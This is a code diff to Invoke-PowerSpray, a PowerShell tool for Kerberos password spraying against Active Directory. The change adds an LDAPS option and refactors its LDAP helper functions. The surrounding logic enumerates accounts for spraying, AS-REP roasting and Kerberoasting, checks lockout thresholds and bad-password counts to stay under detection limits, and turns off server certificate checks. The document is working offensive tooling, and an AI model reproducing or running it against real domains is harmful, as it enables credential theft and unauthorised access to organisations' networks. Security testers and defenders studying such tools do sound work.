@@ -52,6 +52,9 @@ Function Invoke-PowerSpray {
 .PARAMETER Ldap
     Enables domain account enumeration via LDAP.
 
+.PARAMETER SSL
+    Use SSL connection to LDAP server.
+
 .PARAMETER LdapCredential
     Specifies credentials to use for LDAP bind.
 
@@ -167,6 +170,9 @@ Function Invoke-PowerSpray {
         [Switch]
         $Ldap,
 
+        [Switch]
+        $SSL,
+
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
@@ -206,10 +212,8 @@ Function Invoke-PowerSpray {
     )
 
     try {
-        $searchString = "LDAP://$Server/RootDSE"
-        $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
+        $rootDSE = Get-LdapRootDSE -Server $Server
         $defaultNC = $rootDSE.defaultNamingContext[0]
-        $adsPath = "LDAP://$Server/$defaultNC"
         $domain = $defaultNC -replace 'DC=' -replace ',','.'
     }
     catch {
@@ -237,8 +241,7 @@ Function Invoke-PowerSpray {
         }
 
         if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
-            # Get lockout threshold defined in Default Password Policy
-            $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
+            $LockoutThreshold = (Get-LdapObject -Server $Server -SSL:$SSL -Credential $LdapCredential -SearchBase $defaultNC -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
             Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
         }
 
@@ -281,7 +284,7 @@ Function Invoke-PowerSpray {
         foreach ($serviceName in Get-Content $ServiceFilePath) {
             if ($Ldap) {
                 $filter = "&((samAccountName=$serviceName)(servicePrincipalName=*))"
-                if (-not ($service = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential)) {
+                if (-not ($service = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties $properties -Credential $LdapCredential)) {
                     Write-Verbose "$($serviceName)@$($domain) does not exist"
                 }
             }
@@ -304,7 +307,7 @@ Function Invoke-PowerSpray {
             if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                 $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
             }
-            if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+            if ($user = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties $properties -Credential $LdapCredential) {
                 $badPwdCount = $user.badPwdCount
             }
             else {
@@ -341,7 +344,7 @@ Function Invoke-PowerSpray {
                 if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                     $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                 }
-                if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+                if ($user = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties $properties -Credential $LdapCredential) {
                     $badPwdCount = $user.badPwdCount
                 }
                 else {
@@ -387,7 +390,7 @@ Function Invoke-PowerSpray {
                     if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                         $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                     }
-                    if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+                    if ($user = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties $properties -Credential $LdapCredential) {
                         $badPwdCount = $user.badPwdCount
                     }
                     else {
@@ -428,11 +431,11 @@ Function Invoke-PowerSpray {
         if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
-            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter1 -Properties $properties -Credential $LdapCredential
+            $users = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter1 -Properties $properties -Credential $LdapCredential
             if (($users | Measure-Object).Count -gt 0) {
                 # Find all enabled users with a SPN (Kerberoasting)
                 $filter2 = "(&(samAccountType=805306368)(servicePrincipalName=*)$filter)"
-                $services = (Get-LdapObject -ADSpath $adsPath -Filter $filter2 -Properties $properties -Credential $LdapCredential).sAMAccountName
+                $services = (Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter2 -Properties $properties -Credential $LdapCredential).sAMAccountName
             }
         }
         else {
@@ -450,7 +453,7 @@ Function Invoke-PowerSpray {
                 # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
                 $filter = "(&(samAccountType=805306368)$filter)"
             }
-            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
+            $users = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         foreach ($user in $users) {
             if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
@@ -480,7 +483,7 @@ Function Invoke-PowerSpray {
     $params = @{
         EncType = $EncType
         Server = $Server
-        ADSpath = $adsPath
+        SSL = $SSL
         Delay = $Delay
         Jitter = $Jitter
         Ldap = $Ldap
@@ -526,6 +529,9 @@ Function Local:New-KerberosSpray {
         [Switch]
         $Ldap,
 
+        [Switch]
+        $SSL,
+
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
@@ -536,9 +542,6 @@ Function Local:New-KerberosSpray {
 
         [Int]
         $LockoutThreshold,
-
-        [String]
-        $ADSpath,
 
         [Switch]
         $BloodHound,
@@ -579,7 +582,7 @@ Function Local:New-KerberosSpray {
     $noPreauthUser = $null
 
     if ($CheckOldPwd) {
-        $currentUser = ((Get-LdapCurrentUser -Server $Server -Credential $LdapCredential).Split('\\'))[1]
+        $currentUser = (Get-LdapCurrentUser -Server $Server -SSL:$SSL -Credential $LdapCredential).UserName
     }
 
     foreach ($cred in $Collection) {
@@ -675,7 +678,7 @@ Function Local:New-KerberosSpray {
                     $newBadPwdCount = $null
                     if ($CheckOldPwd -and ($($cred.Username) -ne $currentUser)) {
                         $filter = "(samAccountName=$($cred.Username))"
-                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -Credential $LdapCredential).badPwdCount
+                        $newBadPwdCount = (Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties badPwdCount -Credential $LdapCredential).badPwdCount
                     }
                     if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                         $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Renewed'
@@ -1156,14 +1159,42 @@ Function Local:KerberosEncrypt {
     return $output
 }
 
-Function Local:Get-LdapObject {
+Function Local:Get-LdapRootDSE {
     Param (
-        [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ADSpath,
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL
+    )
+
+    $searchString = "LDAP://$Server/RootDSE"
+    if ($SSL) {
+        # Note that the server certificate has to be trusted
+        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
+    }
+    else {
+        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
+    }
+    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
+    return $rootDSE
+}
+
+Function Local:Get-LdapObject {
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL,
 
         [ValidateNotNullOrEmpty()]
+        [String]
+        $SearchBase,
+
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
         $SearchScope = 'Subtree',
 
@@ -1185,25 +1216,117 @@ Function Local:Get-LdapObject {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    if ($Credential.UserName) {
-        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
+    Begin {
+        if ((-not $SearchBase) -or $SSL) {
+            # Get default naming context
+            try {
+                $rootDSE = Get-LdapRootDSE -Server $Server
+                $defaultNC = $rootDSE.defaultNamingContext[0]
+            }
+            catch {
+                Write-Error "Domain controller unreachable"
+                continue
+            }
+            if (-not $SearchBase) {
+                $SearchBase = $defaultNC
+            }
+        }
     }
-    else {
-        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
-    }
-    $searcher.SearchScope = $SearchScope
-    $searcher.PageSize = $PageSize
-    $searcher.CacheResults = $false
-    $searcher.filter = $Filter
-    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
-    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
-    try {
-        $results = $searcher.FindAll()
+
+    Process {
+        try {
+            if ($SSL) {
+                $results = @()
+                $domain = $defaultNC -replace 'DC=' -replace ',','.'
+                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+                $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
+                $searcher.SessionOptions.SecureSocketLayer = $true
+                $searcher.SessionOptions.VerifyServerCertificate = {$true}
+                $searcher.SessionOptions.DomainName = $domain
+                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
+                if ($Credential.UserName) {
+                    $searcher.Bind($Credential)
+                }
+                else {
+                    $searcher.Bind()
+                }
+                if ($Properties -ne '*') {
+                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
+                }
+                else {
+                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
+                }
+                $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
+                $request.Controls.Add($pageRequestControl) | Out-Null
+                $response = $searcher.SendRequest($request)
+                while ($true) {
+                    $response = $searcher.SendRequest($request)
+                    if ($response.ResultCode -eq 'Success') {
+                        foreach ($entry in $response.Entries) {
+                            $results += $entry
+                        }
+                    }
+                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
+                    if ($pageResponseControl.Cookie.Length -eq 0) {
+                        break
+                    }
+                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
+                }
+                
+            }
+            else {
+                $adsPath = "LDAP://$Server/$SearchBase"
+                if ($Credential.UserName) {
+                    $domainObject = New-Object DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+                    $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
+                }
+                else {
+                    $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$adsPath)
+                }
+                $searcher.SearchScope = $SearchScope
+                $searcher.PageSize = $PageSize
+                $searcher.CacheResults = $false
+                $searcher.filter = $Filter
+                $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
+                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
+                $results = $searcher.FindAll()
+            }
+        }
+        catch {
+            Write-Error $_
+            continue
+        }
+
         $results | Where-Object {$_} | ForEach-Object {
+            if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
+                # Convert DirectoryAttribute object (LDAPS results)
+                $p = @{}
+                foreach ($a in $_.Attributes.Keys | Sort-Object) {
+                    if (($a -eq 'objectsid') -or ($a -eq 'sidhistory') -or ($a -eq 'objectguid') -or ($a -eq 'securityidentifier') -or ($a -eq 'msds-allowedtoactonbehalfofotheridentity') -or ($a -eq 'usercertificate') -or ($a -eq 'ntsecuritydescriptor') -or ($a -eq 'logonhours')) {
+                        $p[$a] = $_.Attributes[$a]
+                    }
+                    elseif ($a -eq 'dnsrecord') {
+                        $p[$a] = ($_.Attributes[$a].GetValues([byte[]]))[0]
+                    }
+                    elseif (($a -eq 'whencreated') -or ($a -eq 'whenchanged')) {
+                        $value = ($_.Attributes[$a].GetValues([byte[]]))[0]
+                        $format = "yyyyMMddHHmmss.fZ"
+                        $p[$a] = [datetime]::ParseExact([Text.Encoding]::UTF8.GetString($value), $format, [cultureinfo]::InvariantCulture)
+                    }
+                    else {
+                        $values = @()
+                        foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
+                            $values += [Text.Encoding]::UTF8.GetString($v)
+                        }
+                        $p[$a] = $values
+                    }
+                }
+            }
+            else {
+                $p = $_.Properties
+            }
             $objectProperties = @{}
-            $p = $_.Properties
-            $p.PropertyNames | ForEach-Object {
+            $p.Keys | ForEach-Object {
                 if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                     $objectProperties[$_] = $p[$_][0]
                 }
@@ -1213,11 +1336,15 @@ Function Local:Get-LdapObject {
             }
             New-Object -TypeName PSObject -Property ($objectProperties)
         }
-        $results.dispose()
-        $searcher.dispose()
     }
-    catch {
-        Write-Error $_ -ErrorAction Stop
+
+    End {
+        if ($results -and -not $SSL) {
+            $results.dispose()
+        }
+        if ($searcher) {
+            $searcher.dispose()
+        }
     }
 }
 
@@ -1228,6 +1355,9 @@ Function Local:Get-LdapCurrentUser {
         [String]
         $Server = $Env:USERDNSDOMAIN,
 
+        [Switch]
+        $SSL,
+
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
@@ -1236,16 +1366,25 @@ Function Local:Get-LdapCurrentUser {
 
     try {
         [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
-
-        $conn = New-Object DirectoryServices.Protocols.LdapConnection $Server
+        if ($SSL) {
+            $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
+            $searcher.SessionOptions.SecureSocketLayer = $true
+            $searcher.SessionOptions.VerifyServerCertificate = {$true}
+        }
+        else {
+            $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
+        }
         if ($Credential.UserName) {
-            $conn.Credential = $Credential
+            $searcher.Credential = $Credential
         }
 
         # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
         $extRequest = New-Object DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
-        $resp = $conn.SendRequest($extRequest)
-        [Text.Encoding]::ASCII.GetString($resp.ResponseValue)
+        $resp = [Text.Encoding]::ASCII.GetString($searcher.SendRequest($extRequest).ResponseValue)
+        [pscustomobject] @{
+            "NetbiosName"   = $($resp.split('\')[0].split(':')[-1])
+            "UserName"      = $($resp.split('\')[1])
+        }
     }
     catch {
         Write-Error $_
